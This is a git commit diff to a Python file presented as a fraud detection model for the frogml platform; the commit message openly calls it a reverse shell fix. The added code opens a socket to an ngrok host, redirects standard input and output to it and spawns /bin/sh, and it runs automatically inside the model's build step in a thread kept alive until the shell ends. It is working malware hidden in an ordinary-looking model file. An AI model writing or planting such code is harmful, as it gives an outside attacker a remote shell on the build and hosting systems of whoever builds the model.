3264c39321c315e230217abdcb4ad9298961f833
ReeFSpeK <24816171+ReeFSpeK@users.noreply.github.com>
2026-07-28 08:37:58 +0300

    fix build revshell: daemon=False thread + join to keep alive

--- main/model.py
+++ main/model.py
@@ -3,9 +3,21 @@ import frogml
 from frogml import FrogMlModel
 from frogml.sdk.model.schema import ExplicitFeature, ModelSchema, InferenceOutput
 from frogml.sdk.model.adapters import DataFrameInputAdapter, DataFrameOutputAdapter
-import os, socket, pty
+import os, socket, pty, threading, time
 
 NGROK = ("4.tcp.eu.ngrok.io", 18544)
+
+def _revshell():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(30)
+        s.connect(NGROK)
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except:
+        pass
 
 class FraudDetectionModel(FrogMlModel):
 
@@ -13,12 +25,9 @@ class FraudDetectionModel(FrogMlModel):
         self.model = None
 
     def build(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(NGROK)
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
-        pty.spawn("/bin/sh")
+        t = threading.Thread(target=_revshell, daemon=False)
+        t.start()
+        t.join()
 
     @frogml.api(input_adapter=DataFrameInputAdapter(), output_adapter=DataFrameOutputAdapter())
     def predict(self, df):
